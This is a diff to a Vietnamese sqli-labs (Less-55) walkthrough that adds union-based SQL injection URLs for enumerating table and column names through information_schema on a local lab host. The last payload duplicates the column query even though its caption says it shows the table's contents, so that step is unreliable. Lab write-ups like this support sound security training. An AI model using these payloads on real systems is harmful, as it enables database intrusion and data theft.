@@ -28,9 +28,23 @@ Show được DB đang làm việc với
 
 Show tên của các table trong DB
 
+```
+http://192.168.84.233/sqli-labs/Less-55/index.php?id=1) union select 1,1,group_concat(table_name) from information_schema.tables where table_schema='challenges' limit 1,1--+
+```
+
 ![](../images/sqli-labs/Less-55/10.png)
 
+Show các cột trong bảng vừa show được
+
+```
+http://192.168.84.233/sqli-labs/Less-55/index.php?id=1) union select 1,1,group_concat(column_name) from information_schema.columns where table_schema='challenges' limit 1,1--+
+```
+
 Show thông tin trong bảng vủa show được
+
+```
+http://192.168.84.233/sqli-labs/Less-55/index.php?id=1) union select 1,1,group_concat(column_name) from information_schema.columns where table_schema='challenges' limit 1,1--+
+```
 
 ![](../images/sqli-labs/Less-55/11.png)
 
